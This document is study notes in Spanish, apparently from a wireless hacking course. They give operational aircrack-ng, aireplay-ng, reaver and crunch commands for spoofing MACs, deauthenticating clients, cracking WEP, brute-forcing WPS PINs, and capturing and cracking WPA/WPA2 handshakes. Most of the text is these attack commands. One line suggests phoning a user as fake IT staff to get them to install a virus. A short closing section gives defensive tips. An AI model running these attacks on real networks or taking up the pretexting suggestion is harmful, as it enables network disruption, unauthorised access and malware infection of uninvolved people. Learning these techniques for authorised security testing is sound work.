ifconfig: lista todos los adaptadores conectados al pc
iwconfig: lista solo wirales interfaces 

MAC Address: asigned by manufactures se usan para edentificar pcs en el network y que la informacion se transmita del mac destinatario al mac destino
cambiar el mac adres te permite ser anonimo en la network o bypass filters para que parezcamos otro pc en la network

ponemos ifconfig el parametro ether indica el mac del adaptador

para cambiar el mac del adaptador wifi:
```
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```
(cuando reiniciamos el ordenador el mac volvera a ser el mismo si vuelve a ser el mismo antes de reiniciar el porque el administrador de la red 
a reiniciado las direciones mac de la red)

Manage Mode captura archivos que tengan como mac de destino el pc
Monitor Mode captura todos los archivosen el aire

cambiar adaptador a monitor mode:
```
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```
si no funciona el metodo alternativo:
```
ifconfig wlan0 down
airmon-ng check kill
airmon-ng start wlan0
ifconfig wlan0mon up
```
Packet Sniffing Basics
```
airodump-ng mon0
for 5ghz
airodump-ng --band a mon0
for 5ghz and 2.4
airodump-ng --band abg mon0
```

- BSSID: MAC de la red
- PWD: Mayor numero mejor señal
- Beacons: Frames que envia la red y indican que la red existe
- Data: Paquetes que luego usaremos
- S: Numero de paquetes capturados en los ultimos 10 segundos
- CH: Canal de la red
- MB: Velocidad maxima de la red
- ENC: Encriptacion de la red
- ESSID: Nombres de las redes


Target Packet Sniffing
```
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
```
en la parte extendida de informacion tenemos todos los dispositivos conectados a la red
- BSSID: MAC de la red
- Sation: Mac de dispositivos de la red
- PWR: Calidad de señal de los dispositivos
- Rate: Velocidad de conexion
- Lost: Informacion perdida
- FRAMES: Numero de paquetes capturados
- PROBE: Si el dispositovo esta buscando redes para conectarse

en el directorio principal tendremos varios archivos con la extencion -01 el principal que vamos a usar es el .cap 
que tiene que contener todos los datos enviados desde y hacia la red deve contener urls paswords y users pero esta encriptada
podemos abrir el archivo .cap en wireshark

Deauthentication Attack:   
Vamos a pretender que somos el cliente cambiando nuestro mac a este y enviar al ruter la señal de desconexion y lo mismo con el cliente  
```
aireplay-ng --deauth 10000000 -a (BSSID) -c (STATION) mon0
```
en algunos casos este comando no funcionara a menos que estemos usando airodump-ng contra la red objetivo
pra eso lanzamos el sigiente comando en la terminal de al lado
```
airodump-ng --bssid (BSSID) --channel (Nº) mon0
```
podemos por ejemplo llamar al usuario y decirle que somos del departamento it y convencerles de que instalen un virus

WEP Cracking:  
Initialization Vector (IV) + Key (Wifi Pasword) = Keystream  
Keystream + Data = Encripted data que se envia al ruter con el IV adjuntado para que el ruter la decodifique  
Los IV se repetiran porque solo son en 24bits al capturar varios IV repetidos podemos decodificar la Contraseña de la red  
1. airodump-ng capturamos una gran cantidad de paquete IV  
2. aircrack-ng analizamos y crackeamos la contraseña   
```
airodump-ng mon0
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
aircrack-ng (.cap file name)
```
Key Found (41:41:41:41:41)  
reiniciamos kali quitamos los : para obtener 4141414141 y nos conectamos a la red con esta contraseña  
o usamos el ASCII como contraseña si obtenemos esta  

Si la red WEP al escanear vemos que DATA tiene pocos paquetes
tendremos que forzar la punto de aceso para que genere nuevos IV
```
airodump-ng mon0
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
```
en la ventana del al lado mientra este comando este coriendo
```
ifconfig
aireplay-ng --fakeauth 0 -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
```
de esta forma apareceremos como dispositivo asociado a la red
ahora empezamos a inllectar paquetes en la red y esperamos los paquetes ARP el ruter se vera forzado a generar nuevos paquetes con IVs
en la ventana de al lado coremos
```
aireplay-ng --arpreplay -b (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
```
nos volvemos a asociar a la red por si acaso y coremos
```
aircrack-ng (.cap file)
```

## WPS Crack
solo funciona si el ruter no tiene protecion PBC push button autentification
```
wash --interface mon0
```
Lck: muestra si el wps esta bloqueado porque despues de unos intentos se bloquea
```
reaver --bssid (BSSID) --channel (Nº) --interface mon0 -vvv --no-associate
```
si obtenemos error es que nesecitamos usar una vercion anterior de reaver porque esta no funciona bien
descargamos la vercion recomendada chmod +x reaver y ./reaver --bssid (BSSID) --channel (Nº) --interface mon0 -vvv --no-associate
mientras rever intenta brutforce la red coremos el sigiente comando en la terminal de aldo para que el ruter no nos ignore
ifconfig
```
aireplay-ng --fakeauth 30(nos asociamos cada 30 segundos) -a (BSSID) -h (Mac del adaptador wifi los primeros 12 caracteres de unspec cambiar las - por :) mon0
```

WPA / WPA2 Cracking  
solo los handshakes tienen informacion util  
captura de handshakes:  
```
airodump-ng mon0
airodump-ng --bssid (BSSID) --channel (Nº) --write (file name) mon0
```
ahora solo sientate y espera a recibir el handshake cuando se algun dispositivo se conecte a la red en la parte de la derecha de la ventana 

puedes para no esperar deautentificar al cliente este volvera a intentar conectarse y asi capturamos el handshake
```
aireplay-ng --deauth 4 -a (BSSID) -c (STATION) mon0
```
en la ventana de ariba a la derecha veremos el handshake

Creating a Wordlist
```
man crunch
crunch [min character number] [max character number] [Characters] -o [filename] -t [pattern]
crunch 6 8 123abc@$ -o wordlist -t a@@@@b
```
CRACK HANDSHAKE (Comparamos MIC)
```
aircrack-ng (.cap file) -w (worldlist .txt)
```
Hay empresas online donde puedes subir el handshake y ellos te lo analizan

conclucion:  
no usar wep  
usar wpa2 con contraseñas complejas  
asegurar que wps esta desabilitado  

obtenemos la ip del ordenador ifconfig wlan0 vamos a la ip 1 de la subnet para entrar en la pagina del router  
si nos atacan con deautentificacion nos podemos conectar con el cable  
Access Control podemos especificar que mac permitimos conectar a la red y cuales no  
